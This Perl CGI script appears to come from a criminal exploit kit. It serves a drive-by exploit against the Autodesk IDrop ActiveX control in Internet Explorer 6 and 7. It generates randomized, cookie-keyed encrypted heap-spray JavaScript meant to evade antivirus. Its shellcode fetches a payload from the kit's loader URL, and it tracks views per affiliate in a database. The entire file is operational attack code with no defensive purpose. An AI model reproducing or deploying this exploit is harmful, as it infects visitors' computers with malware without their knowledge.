#!/usr/bin/perl

#
# var randomizer for Autodesk IDrop ActiveX exploit (Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0)
# FUD for all AV using random XOR + random Vars + Replace string of eval
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../lib/EncRand.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET autodesk_iodrop=autodesk_iodrop+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$csname = $q->param('csname');

#Insert the view param on exploit
$sql = "UPDATE exploits SET autodesk_iodrop=autodesk_iodrop+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#get the cookie value from name
$theCookie = $q->cookie($csname);

#randomize vars
$idrop         = JsXOR::generate_random_string(int(rand 100));
$j_function    = JsXOR::generate_random_string(int(rand 100));
$j_shellcode   = JsXOR::generate_random_string(int(rand 100));
$j_nops        = JsXOR::generate_random_string(int(rand 100));
$j_headersize  = JsXOR::generate_random_string(int(rand 100));
$j_slackspace  = JsXOR::generate_random_string(int(rand 100));
$j_fillblock   = JsXOR::generate_random_string(int(rand 100));
$j_block       = JsXOR::generate_random_string(int(rand 100));
$j_memory      = JsXOR::generate_random_string(int(rand 100));
$j_counter     = JsXOR::generate_random_string(int(rand 100));
$j_ret         = JsXOR::generate_random_string(int(rand 30));
$j_mem         = JsXOR::generate_random_string(int(rand 100));

#Build the shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=autodesk_iodrop';
$shellcode = Shellcode::getshell($urlllll);

#exec var
$nops = '%u0c0c%u0c0c';
$blocksize = 0x40000;
$fillto = 550;
$offset = 900;

$javascript = <<EOF;

function $j_function() {
$j_shellcode=unescape('$shellcode');
$j_nops=unescape('$nops');
$j_headersize=20;
$j_slackspace=$j_headersize+$j_shellcode.length;
while($j_nops.length<$j_slackspace)$j_nops+=$j_nops;
$j_fillblock=$j_nops.substring(0,$j_slackspace);
$j_block=$j_nops.substring(0,$j_nops.length-$j_slackspace);
while($j_block.length+$j_slackspace<$blocksize)$j_block=$j_block+$j_block+$j_fillblock;
$j_memory=new Array();
for($j_counter=0;$j_counter<$fillto;$j_counter++)$j_memory\[$j_counter]=$j_block+$j_shellcode;

var $j_ret = '';
for ($j_counter=0;$j_counter<=$offset;$j_counter++) {
$j_ret += unescape('%u0a0a');
}
for($j_counter=0;$j_counter<20;$j_counter++) {
try {
var $j_mem = $idrop.Src;
$idrop.Src = 'http://' + $j_ret;
$idrop.Src = $j_mem;
$idrop.Src = 'http://' + $j_ret;
} catch(e){}
}
}

EOF

$header2 = <<EOFHEA;

<html>
<head>
<script language='javascript' defer>

EOFHEA

$footer1 = <<EOFFOOT;

</script>
</head>
<body onload='return $j_function();'>
<object classid='clsid:21E0CB95-1198-4945-A3D2-4BF804295F78' id='$idrop'></object>
</body>
</html>

EOFFOOT

#$beforexoredd = JsXOR::excryptxorjs($javascript);
$beforexoredd = EncRand::CsCrypt($javascript,$csname,$theCookie);

###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print "$header2";
print $beforexoredd;
print "$footer1";

####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
